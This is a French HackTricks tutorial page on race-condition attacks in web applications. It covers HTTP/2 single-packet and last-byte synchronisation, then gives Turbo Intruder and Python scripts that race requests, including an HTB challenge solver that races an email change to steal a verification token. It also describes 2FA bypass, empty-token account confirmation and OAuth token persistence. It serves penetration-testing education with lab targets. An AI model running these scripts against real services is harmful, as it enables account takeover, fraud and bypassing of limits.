# Condition de Course

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_term=trickest\&utm\_content=race-condition) pour cr√©er et **automatiser des flux de travail** facilement gr√¢ce aux **outils communautaires les plus avanc√©s** au monde.\
Acc√©dez d√®s aujourd'hui :

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=race-condition" %}

{% hint style="success" %}
Apprenez et pratiquez le Hacking AWS :<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le Hacking GCP : <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PR au** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos GitHub.

</details>
{% endhint %}

{% hint style="warning" %}
Pour obtenir une compr√©hension approfondie de cette technique, consultez le rapport original sur [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
{% endhint %}

## Am√©lioration des Attaques par Condition de Course

Le principal obstacle pour tirer parti des conditions de course est de s'assurer que plusieurs requ√™tes sont trait√©es en m√™me temps, avec **tr√®s peu de diff√©rence dans leurs temps de traitement‚Äîid√©alement, moins de 1ms**.

Ici, vous pouvez trouver quelques techniques pour Synchroniser les Requ√™tes :

#### Attaque √† Paquet Unique HTTP/2 vs. Synchronisation du Dernier Octet HTTP/1.1

* **HTTP/2** : Prend en charge l'envoi de deux requ√™tes sur une seule connexion TCP, r√©duisant l'impact du jitter r√©seau. Cependant, en raison des variations c√¥t√© serveur, deux requ√™tes peuvent ne pas suffire pour une exploitation coh√©rente de la condition de course.
* **Synchronisation du 'Dernier Octet' HTTP/1.1** : Permet l'envoi pr√©alable de la plupart des parties de 20-30 requ√™tes, en retenant un petit fragment, qui est ensuite envoy√© ensemble, atteignant simultan√©ment le serveur.

**La pr√©paration pour la Synchronisation du Dernier Octet** implique :

1. Envoyer les en-t√™tes et les donn√©es du corps sans le dernier octet sans terminer le flux.
2. Faire une pause de 100ms apr√®s l'envoi initial.
3. D√©sactiver TCP\_NODELAY pour utiliser l'algorithme de Nagle pour regrouper les derniers paquets.
4. Pinger pour r√©chauffer la connexion.

L'envoi subs√©quent des paquets retenus devrait aboutir √† leur arriv√©e dans un seul paquet, v√©rifiable via Wireshark. Cette m√©thode ne s'applique pas aux fichiers statiques, qui ne sont g√©n√©ralement pas impliqu√©s dans les attaques RC.

### S'adapter √† l'Architecture du Serveur

Comprendre l'architecture de la cible est crucial. Les serveurs frontaux peuvent acheminer les requ√™tes diff√©remment, affectant le timing. Le r√©chauffement pr√©ventif des connexions c√¥t√© serveur, par le biais de requ√™tes sans cons√©quence, pourrait normaliser le timing des requ√™tes.

#### Gestion du Verrouillage Bas√© sur les Sessions

Des frameworks comme le gestionnaire de sessions PHP s√©rialisent les requ√™tes par session, obscurcissant potentiellement les vuln√©rabilit√©s. Utiliser diff√©rents jetons de session pour chaque requ√™te peut contourner ce probl√®me.

#### Surmonter les Limites de Taux ou de Ressources

Si le r√©chauffement de la connexion est inefficace, d√©clencher intentionnellement les d√©lais de limite de taux ou de ressources des serveurs web par un afflux de requ√™tes fictives pourrait faciliter l'attaque √† paquet unique en induisant un d√©lai c√¥t√© serveur propice aux conditions de course.

## Exemples d'Attaque

* **Tubo Intruder - attaque √† paquet unique HTTP2 (1 point de terminaison)** : Vous pouvez envoyer la requ√™te √† **Turbo intruder** (`Extensions` -> `Turbo Intruder` -> `Send to Turbo Intruder`), vous pouvez changer dans la requ√™te la valeur que vous souhaitez forcer pour **`%s`** comme dans `csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s` et ensuite s√©lectionner le **`examples/race-single-packer-attack.py`** dans le menu d√©roulant :

<figure><img src="../.gitbook/assets/image (57).png" alt=""><figcaption></figcaption></figure>

Si vous allez **envoyer diff√©rentes valeurs**, vous pourriez modifier le code avec celui-ci qui utilise une liste de mots depuis le presse-papiers :
```python
passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
```
{% hint style="warning" %}
Si le web ne prend pas en charge HTTP2 (uniquement HTTP1.1), utilisez `Engine.THREADED` ou `Engine.BURP` au lieu de `Engine.BURP2`.
{% endhint %}

* **Tubo Intruder - attaque par paquet unique HTTP2 (Plusieurs points de terminaison)** : Dans le cas o√π vous devez envoyer une requ√™te √† 1 point de terminaison et ensuite plusieurs √† d'autres points de terminaison pour d√©clencher le RCE, vous pouvez modifier le script `race-single-packet-attack.py` avec quelque chose comme :
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
```
* Il est √©galement disponible dans **Repeater** via la nouvelle option '**Envoyer le groupe en parall√®le**' dans Burp Suite.
* Pour **limit-overrun**, vous pourriez simplement ajouter la **m√™me requ√™te 50 fois** dans le groupe.
* Pour **connection warming**, vous pourriez **ajouter** au **d√©but** du **groupe** quelques **requ√™tes** vers une partie non statique du serveur web.
* Pour **delaying** le processus **entre** le traitement **d'une requ√™te et une autre** en 2 √©tapes substantielles, vous pourriez **ajouter des requ√™tes suppl√©mentaires entre** les deux requ√™tes.
* Pour un RC **multi-endpoint**, vous pourriez commencer √† envoyer la **requ√™te** qui **va √† l'√©tat cach√©** et ensuite **50 requ√™tes** juste apr√®s qui **exploite l'√©tat cach√©**.

<figure><img src="../.gitbook/assets/image (58).png" alt=""><figcaption></figcaption></figure>

* **Script python automatis√©** : L'objectif de ce script est de changer l'email d'un utilisateur tout en le v√©rifiant continuellement jusqu'√† ce que le token de v√©rification du nouvel email arrive √† l'ancien email (c'est parce que dans le code, on voyait un RC o√π il √©tait possible de modifier un email mais d'avoir la v√©rification envoy√©e √† l'ancien car la variable indiquant l'email √©tait d√©j√† peupl√©e avec le premier).\
Lorsque le mot "objetivo" est trouv√© dans les emails re√ßus, nous savons que nous avons re√ßu le token de v√©rification de l'email chang√© et nous mettons fin √† l'attaque.
```python
# https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
# Script from victor to solve a HTB challenge
from h2spacex import H2OnTlsConnection
from time import sleep
from h2spacex import h2_frames
import requests

cookie="session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzEwMzA0MDY1LCJhbnRpQ1NSRlRva2VuIjoiNDJhMDg4NzItNjEwYS00OTY1LTk1NTMtMjJkN2IzYWExODI3In0.I-N93zbVOGZXV_FQQ8hqDMUrGr05G-6IIZkyPwSiiDg"

# change these headers

headersObjetivo= """accept: */*
content-type: application/x-www-form-urlencoded
Cookie: """+cookie+"""
Content-Length: 112
"""

bodyObjetivo = 'email=objetivo%40apexsurvive.htb&username=estes&fullName=test&antiCSRFToken=42a08872-610a-4965-9553-22d7b3aa1827'

headersVerification= """Content-Length: 1
Cookie: """+cookie+"""
"""
CSRF="42a08872-610a-4965-9553-22d7b3aa1827"

host = "94.237.56.46"
puerto =39697


url = "https://"+host+":"+str(puerto)+"/email/"

response = requests.get(url, verify=False)


while "objetivo" not in response.text:

urlDeleteMails = "https://"+host+":"+str(puerto)+"/email/deleteall/"

responseDeleteMails = requests.get(urlDeleteMails, verify=False)
#print(response.text)
# change this host name to new generated one

Headers = { "Cookie" : cookie, "content-type": "application/x-www-form-urlencoded" }
data="email=test%40email.htb&username=estes&fullName=test&antiCSRFToken="+CSRF
urlReset="https://"+host+":"+str(puerto)+"/challenge/api/profile"
responseReset = requests.post(urlReset, data=data, headers=Headers, verify=False)

print(responseReset.status_code)

h2_conn = H2OnTlsConnection(
hostname=host,
port_number=puerto
)

h2_conn.setup_connection()

try_num = 100

stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=try_num)

all_headers_frames = []  # all headers frame + data frames which have not the last byte
all_data_frames = []  # all data frames which contain the last byte


for i in range(0, try_num):
last_data_frame_with_last_byte=''
if i == try_num/2:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(  # noqa: E501
method='POST',
headers_string=headersObjetivo,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=bodyObjetivo,
path='/challenge/api/profile'
)
else:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(
method='GET',
headers_string=headersVerification,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=".",
path='/challenge/api/sendVerification'
)

all_headers_frames.append(header_frames_without_last_byte)
all_data_frames.append(last_data_frame_with_last_byte)


# concatenate all headers bytes
temp_headers_bytes = b''
for h in all_headers_frames:
temp_headers_bytes += bytes(h)

# concatenate all data frames which have last byte
temp_data_bytes = b''
for d in all_data_frames:
temp_data_bytes += bytes(d)

h2_conn.send_bytes(temp_headers_bytes)

# wait some time
sleep(0.1)

# send ping frame to warm up connection
h2_conn.send_ping_frame()

# send remaining data frames
h2_conn.send_bytes(temp_data_bytes)

resp = h2_conn.read_response_from_socket(_timeout=3)
frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
frame_parser.add_frames(resp)
frame_parser.show_response_of_sent_requests()

print('---')

sleep(3)
h2_conn.close_connection()

response = requests.get(url, verify=False)
```
### Am√©lioration de l'attaque par paquet unique

Dans la recherche originale, il est expliqu√© que cette attaque a une limite de 1 500 octets. Cependant, dans [**ce post**](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/), il a √©t√© expliqu√© comment il est possible d'√©tendre la limitation de 1 500 octets de l'attaque par paquet unique √† la **limitation de fen√™tre de 65 535 B de TCP en utilisant la fragmentation au niveau IP** (en divisant un seul paquet en plusieurs paquets IP) et en les envoyant dans un ordre diff√©rent, ce qui a permis d'emp√™cher le r√©assemblage du paquet jusqu'√† ce que tous les fragments atteignent le serveur. Cette technique a permis au chercheur d'envoyer 10 000 requ√™tes en environ 166 ms.&#x20;

Notez que bien que cette am√©lioration rende l'attaque plus fiable dans le RC qui n√©cessite que des centaines/milliers de paquets arrivent en m√™me temps, elle peut √©galement avoir certaines limitations logicielles. Certains serveurs HTTP populaires comme Apache, Nginx et Go ont un param√®tre strict `SETTINGS_MAX_CONCURRENT_STREAMS` de 100, 128 et 250. Cependant, d'autres comme NodeJS et nghttp2 l'ont illimit√©.\
Cela signifie essentiellement qu'Apache ne consid√©rera que 100 connexions HTTP √† partir d'une seule connexion TCP (limitant cette attaque RC).

Vous pouvez trouver quelques exemples utilisant cette technique dans le d√©p√¥t [https://github.com/Ry0taK/first-sequence-sync/tree/main](https://github.com/Ry0taK/first-sequence-sync/tree/main).

## BF brut

Avant la recherche pr√©c√©dente, voici quelques charges utiles utilis√©es qui essayaient simplement d'envoyer les paquets aussi rapidement que possible pour provoquer un RC.

* **R√©p√©teur :** Consultez les exemples de la section pr√©c√©dente.
* **Intrus :** Envoyez la **requ√™te** √† **Intrus**, d√©finissez le **nombre de threads** √† **30** dans le **menu Options** et s√©lectionnez comme charge utile **Charges utiles nulles** et g√©n√©rez **30.**
* **Turbo Intrus**
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```
* **Python - asyncio**
```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```
## **M√©thodologie RC**

### Limite-d√©passement / TOCTOU

C'est le type de condition de course le plus basique o√π **les vuln√©rabilit√©s** **apparaissent** dans des endroits qui **limitent le nombre de fois que vous pouvez effectuer une action**. Comme utiliser le m√™me code de r√©duction dans un magasin en ligne plusieurs fois. Un exemple tr√®s simple peut √™tre trouv√© dans [**ce rapport**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43) ou dans [**ce bug**](https://hackerone.com/reports/759247)**.**

Il existe de nombreuses variations de ce type d'attaque, y compris :

* √âchanger une carte-cadeau plusieurs fois
* √âvaluer un produit plusieurs fois
* Retirer ou transf√©rer de l'argent en exc√®s de votre solde de compte
* R√©utiliser une seule solution CAPTCHA
* Contourner une limite de taux anti-force brute

### **Sous-√©tats cach√©s**

Exploiter des conditions de course complexes implique souvent de tirer parti d'opportunit√©s br√®ves pour interagir avec des sous-√©tats machine cach√©s ou **non intentionnels**. Voici comment proc√©der :

1. **Identifier les sous-√©tats cach√©s potentiels**
* Commencez par identifier les points de terminaison qui modifient ou interagissent avec des donn√©es critiques, telles que les profils d'utilisateur ou les processus de r√©initialisation de mot de passe. Concentrez-vous sur :
* **Stockage** : Pr√©f√©rez les points de terminaison qui manipulent des donn√©es persistantes c√¥t√© serveur plut√¥t que ceux qui g√®rent des donn√©es c√¥t√© client.
* **Action** : Recherchez des op√©rations qui modifient des donn√©es existantes, qui sont plus susceptibles de cr√©er des conditions exploitables par rapport √† celles qui ajoutent de nouvelles donn√©es.
* **Cl√©** : Les attaques r√©ussies impliquent g√©n√©ralement des op√©rations bas√©es sur le m√™me identifiant, par exemple, le nom d'utilisateur ou le jeton de r√©initialisation.
2. **Effectuer un premier sondage**
* Testez les points de terminaison identifi√©s avec des attaques de condition de course, en observant toute d√©viation par rapport aux r√©sultats attendus. Des r√©ponses inattendues ou des changements dans le comportement de l'application peuvent signaler une vuln√©rabilit√©.
3. **D√©montrer la vuln√©rabilit√©**
* R√©duisez l'attaque au nombre minimal de requ√™tes n√©cessaires pour exploiter la vuln√©rabilit√©, souvent juste deux. Cette √©tape peut n√©cessiter plusieurs tentatives ou de l'automatisation en raison du timing pr√©cis impliqu√©.

### Attaques sensibles au temps

La pr√©cision dans le timing des requ√™tes peut r√©v√©ler des vuln√©rabilit√©s, surtout lorsque des m√©thodes pr√©visibles comme les horodatages sont utilis√©es pour les jetons de s√©curit√©. Par exemple, g√©n√©rer des jetons de r√©initialisation de mot de passe bas√©s sur des horodatages pourrait permettre des jetons identiques pour des requ√™tes simultan√©es.

**Pour exploiter :**

* Utilisez un timing pr√©cis, comme une attaque par paquet unique, pour faire des requ√™tes de r√©initialisation de mot de passe simultan√©es. Des jetons identiques indiquent une vuln√©rabilit√©.

**Exemple :**

* Demandez deux jetons de r√©initialisation de mot de passe en m√™me temps et comparez-les. Des jetons correspondants sugg√®rent un d√©faut dans la g√©n√©ration de jetons.

**V√©rifiez ceci** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities) **pour essayer cela.**

## √âtudes de cas sur les sous-√©tats cach√©s

### Payer & ajouter un article

V√©rifiez ce [**PortSwigger Lab**](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation) pour voir comment **payer** dans un magasin et **ajouter un article suppl√©mentaire** que vous **n'aurez pas besoin de payer**.

### Confirmer d'autres e-mails

L'id√©e est de **v√©rifier une adresse e-mail et de la changer en une autre en m√™me temps** pour d√©couvrir si la plateforme v√©rifie la nouvelle adresse modifi√©e.

### Changer l'e-mail en 2 adresses e-mail bas√©es sur des cookies

Selon [**cette recherche**](https://portswigger.net/research/smashing-the-state-machine), Gitlab √©tait vuln√©rable √† une prise de contr√¥le de cette mani√®re car il pourrait **envoyer** le **jeton de v√©rification d'e-mail d'un e-mail √† l'autre**.

**V√©rifiez ceci** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint) **pour essayer cela.**

### √âtats de base de donn√©es cach√©s / Contournement de confirmation

Si **2 √©critures diff√©rentes** sont utilis√©es pour **ajouter** **des informations** dans une **base de donn√©es**, il y a une petite portion de temps o√π **seules les premi√®res donn√©es ont √©t√© √©crites** dans la base de donn√©es. Par exemple, lors de la cr√©ation d'un utilisateur, le **nom d'utilisateur** et le **mot de passe** peuvent √™tre **√©crits** et **ensuite le jeton** pour confirmer le compte nouvellement cr√©√© est √©crit. Cela signifie que pendant un court instant, le **jeton pour confirmer un compte est nul**.

Par cons√©quent, **enregistrer un compte et envoyer plusieurs requ√™tes avec un jeton vide** (`token=` ou `token[]=` ou toute autre variation) pour confirmer le compte imm√©diatement pourrait permettre de c**onfirmer un compte** o√π vous ne contr√¥lez pas l'e-mail.

**V√©rifiez ceci** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction) **pour essayer cela.**

### Contournement de 2FA

Le pseudo-code suivant est vuln√©rable √† une condition de course car pendant un tr√®s court instant, le **2FA n'est pas appliqu√©** pendant que la session est cr√©√©e :
```python
session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```
### OAuth2 persistance √©ternelle

Il existe plusieurs [**fournisseurs OAUth**](https://en.wikipedia.org/wiki/List\_of\_OAuth\_providers). Ces services vous permettront de cr√©er une application et d'authentifier les utilisateurs que le fournisseur a enregistr√©s. Pour ce faire, le **client** devra **permettre √† votre application** d'acc√©der √† certaines de ses donn√©es √† l'int√©rieur du **fournisseur OAUth**.\
Donc, jusqu'ici, c'est juste une connexion classique avec google/linkedin/github... o√π vous √™tes invit√© avec une page disant : "_L'application \<InsertCoolName> souhaite acc√©der √† vos informations, voulez-vous l'autoriser ?_"

#### Condition de course dans `authorization_code`

Le **probl√®me** appara√Æt lorsque vous **l'acceptez** et qu'il envoie automatiquement un **`authorization_code`** √† l'application malveillante. Ensuite, cette **application abuse d'une Condition de course dans le fournisseur de service OAUth pour g√©n√©rer plus d'un AT/RT** (_Token d'authentification/Token de rafra√Æchissement_) √† partir du **`authorization_code`** pour votre compte. En gros, elle va abuser du fait que vous avez accept√© l'application pour acc√©der √† vos donn√©es afin de **cr√©er plusieurs comptes**. Ensuite, si vous **arr√™tez de permettre √† l'application d'acc√©der √† vos donn√©es, une paire d'AT/RT sera supprim√©e, mais les autres resteront valides**.

#### Condition de course dans `Refresh Token`

Une fois que vous avez **obtenu un RT valide**, vous pourriez essayer de **l'abuser pour g√©n√©rer plusieurs AT/RT** et **m√™me si l'utilisateur annule les autorisations** pour l'application malveillante d'acc√©der √† ses donn√©es, **plusieurs RT resteront valides.**

## **RC dans WebSockets**

Dans [**WS\_RaceCondition\_PoC**](https://github.com/redrays-io/WS\_RaceCondition\_PoC), vous pouvez trouver un PoC en Java pour envoyer des messages websocket en **parall√®le** afin d'abuser des **Conditions de course √©galement dans les Web Sockets**.

## R√©f√©rences

* [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
* [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
* [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
* [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
* [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)

{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Formation AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Formation GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_term=trickest\&utm\_content=race-condition) pour cr√©er facilement et **automatiser des flux de travail** aliment√©s par les **outils communautaires les plus avanc√©s** au monde.\
Obtenez un acc√®s aujourd'hui :

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=race-condition" %}
